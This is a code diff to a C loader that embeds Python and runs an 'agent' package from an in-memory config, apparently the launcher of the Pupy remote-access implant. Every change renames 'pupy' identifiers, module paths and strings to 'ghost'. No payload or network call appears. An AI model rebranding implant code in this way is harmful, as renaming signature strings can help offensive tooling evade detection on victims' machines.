@@ -15,7 +15,7 @@ struct py_imports py_sym_table[] = {
     { NULL, NULL }, /* sentinel */
 };
 
-static char __config__[500000] = "####---PUPY_CONFIG_COMES_HERE---####\n";
+static char __config__[500000] = "####---GHOST_CONFIG_COMES_HERE---####\n";
 
 static PyGILState_STATE restore_state;
 static BOOL is_initialized = FALSE;
@@ -423,7 +423,7 @@ PyObject *py_eval_package_init(
             dprint("modname: %s modname_len: %d name_len: %d\n", modname, modname_len, name_len );
             
             /*
-            if (strncmp("pupy.", modname, 5)) {
+            if (strncmp("ghost.", modname, 5)) {
                 continue;
             }
             */
@@ -645,9 +645,9 @@ static PyObject* py_module_from_stdlib(PyObject *py_stdlib, const char *name, in
 
     int is_path = 1;
 
-    // pupy:// name /__init__.pyo
+    // ghost:// name /__init__.pyo
     // OR
-    // pupy:// name .pyo
+    // ghost:// name .pyo
 
     size_t vpath_len =
         strlen(name)
@@ -673,7 +673,7 @@ static PyObject* py_module_from_stdlib(PyObject *py_stdlib, const char *name, in
     else
         strcat(vpath_name, VPATH_EXT);
 
-    // same string without pupy://
+    // same string without ghost://
     path_name = vpath_name + sizeof(VPATH_PREFIX) - 1;
 
     pybody = PyDict_GetItemString(py_stdlib, path_name);
@@ -804,17 +804,17 @@ void py_clear_sys_dict(const char *name)
 }
 
 
-void run_pupy() {
+void run_ghost() {
     union {
         unsigned int l;
         unsigned char c[4];
     } len;
 
-    PyObject *pupy;
+    PyObject *ghost;
 
     PyObject *py_config_list;
-    PyObject *py_pupylib;
-    PyObject *pupy_dict;
+    PyObject *py_ghostlib;
+    PyObject *ghost_dict;
     PyObject *py_debug;
     PyObject *py_main;
     PyObject *py_eval_result;
@@ -868,11 +868,11 @@ void run_pupy() {
     py_config = PyList_GetItem(py_config_list, 0);
     dprint("Get config: %p\n", py_config);
 
-    py_pupylib = PyList_GetItem(py_config_list, 1);
-    dprint("Get pupy: %p\n", py_pupylib);
+    py_ghostlib = PyList_GetItem(py_config_list, 1);
+    dprint("Get ghost: %p\n", py_ghostlib);
 
     dprint("Update stdlib\n");
-    PyDict_Update(py_stdlib, py_pupylib);
+    PyDict_Update(py_stdlib, py_ghostlib);
     Py_IncRef(py_config);
 
     
@@ -934,7 +934,7 @@ void run_pupy() {
         goto lbExit4;
     if (!py_module_from_stdlib(py_stdlib, "importlib.util", 0))
         goto lbExit4;
-    //if (!py_module_from_stdlib(py_stdlib, "pupy.utils", 0))
+    //if (!py_module_from_stdlib(py_stdlib, "ghost.utils", 0))
     //    goto lbExit4;
     
     
@@ -1011,34 +1011,34 @@ void run_pupy() {
     
     /*
     res = PyRun_SimpleString(
-        "import _pupy;"
-        "print(_pupy, "
+        "import _ghost;"
+        "print(_ghost, "
                "file=sys.stderr)");
     if (res < 0) {
         exit(1);
     }
     */
 
-    dprint("Loading pupy\n");
+    dprint("Loading ghost\n");
 
-    if (!py_module_from_stdlib(py_stdlib, "pupy", 1))
+    if (!py_module_from_stdlib(py_stdlib, "ghost", 1))
         goto lbExit4;
-    //if (!py_module_from_stdlib(py_stdlib, "pupy.agent.winerror_hacks", 0))
+    //if (!py_module_from_stdlib(py_stdlib, "ghost.agent.winerror_hacks", 0))
     //    goto lbExit4;
 
-    pupy = py_module_from_stdlib(py_stdlib, "pupy.agent", 1);
-    if (!pupy)
+    ghost = py_module_from_stdlib(py_stdlib, "ghost.agent", 1);
+    if (!ghost)
         goto lbExit4;
 
-    if (!py_module_from_stdlib(py_stdlib, "pupy.agent.utils", 0))
+    if (!py_module_from_stdlib(py_stdlib, "ghost.agent.utils", 0))
         goto lbExit4;
 
 
-    pupy_dict = PyModule_GetDict(pupy);
-    py_main = PyDict_GetItemString(pupy_dict, "main");
+    ghost_dict = PyModule_GetDict(ghost);
+    py_main = PyDict_GetItemString(ghost_dict, "main");
 
     if (!py_main) {
-        dprint("pupy.agent.main not found\n");
+        dprint("ghost.agent.main not found\n");
         goto lbExit3;
     }
 
@@ -1049,7 +1049,7 @@ void run_pupy() {
 #endif
 
     dprint(
-        "Call pupy.agent.main: %p(%p, %p, %p)\n",
+        "Call ghost.agent.main: %p(%p, %p, %p)\n",
         py_main, Py_None, py_debug, py_config
     );
 
